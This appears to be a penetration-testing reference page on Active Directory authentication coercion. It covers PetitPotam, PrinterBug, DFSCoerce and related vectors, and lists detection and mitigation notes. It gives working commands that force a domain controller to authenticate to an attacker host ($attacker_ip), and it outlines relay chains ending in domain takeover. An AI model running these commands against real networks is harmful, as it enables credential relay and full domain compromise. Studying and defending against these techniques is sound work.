---
title: Authentication coercion
category: AD / Relay & Coercion
order: 20
tags: [coercion, petitpotam, printerbug, dfscoerce, webclient, ms-rprn]
summary: >
  Force a remote machine (often a DC) to authenticate to you over SMB or HTTP,
  producing a NetNTLM auth you can relay (to LDAP for RBCD, to AD CS for ESC8,
  or capture for unconstrained delegation).
prerequisites:
  - Usually a domain account (some vectors work unauthenticated depending on patch level)
  - A listener/relay at $attacker_ip; the target must be able to reach it
  - A relay target that does not enforce signing/EPA (see NTLM relay)
tools: [PetitPotam, printerbug.py (dementor), dfscoerce.py, coercer, ntlmrelayx]
detection:
  - Inbound MS-EFSR/MS-RPRN/MS-DFSNM RPC calls from unusual hosts
  - A computer account authenticating to a non-standard host (relay host)
mitigation:
  - Patch coercion CVEs; disable the Print Spooler / WebClient where unneeded
  - Enforce SMB signing + LDAP channel binding + AD CS EPA to break the relay
refs:
  - { label: "PetitPotam (topotam)", url: "https://github.com/topotam/PetitPotam" }
  - { label: "Coercer", url: "https://github.com/p0dalirius/Coercer" }
  - { label: "HackTricks — Force auth", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse" }
---

Coercion is the "trigger" half of a relay chain — it makes the victim
authenticate on demand. Pair it with a relay (NTLM relay page) or a listener.

## Vectors

| Vector | Protocol / RPC | Note |
|---|---|---|
| PetitPotam | MS-EFSRPC | often DC → you; some methods need no creds pre-patch |
| PrinterBug | MS-RPRN (Spooler) | needs Spooler running on target |
| DFSCoerce | MS-DFSNM | works when Spooler is disabled |
| ShadowCoerce | MS-FSRVP | file-server VSS agent |
| WebClient | HTTP (WebDAV) | yields HTTP auth → relay to LDAP/ADCS |

## Trigger

```sh
# PetitPotam — coerce $dc_host to auth to you
petitpotam.py -u $user -p $password -d $domain $attacker_ip $dc_host
```

```sh
# PrinterBug (MS-RPRN)
printerbug.py $domain/$user:$password@$dc_host $attacker_ip
# DFSCoerce (MS-DFSNM)
dfscoerce.py -u $user -p $password -d $domain $attacker_ip $dc_host
```

```sh
# Coercer — try many methods at once
coercer coerce -u $user -p $password -d $domain -t $dc_host -l $attacker_ip
```

## Chain it

- **→ AD CS HTTP (ESC8):** coerce DC$ → relay to `certsrv` → DC certificate →
  TGT → DCSync. See the PetitPotam→ESC8 attack path.
- **→ LDAP (RBCD):** coerce a computer → relay to LDAP → set RBCD on it → take
  it over. See Delegation / RBCD.
- **→ Unconstrained host:** coerce DC$ toward a host you own that has
  unconstrained delegation → capture the DC TGT. See Delegation / Unconstrained.
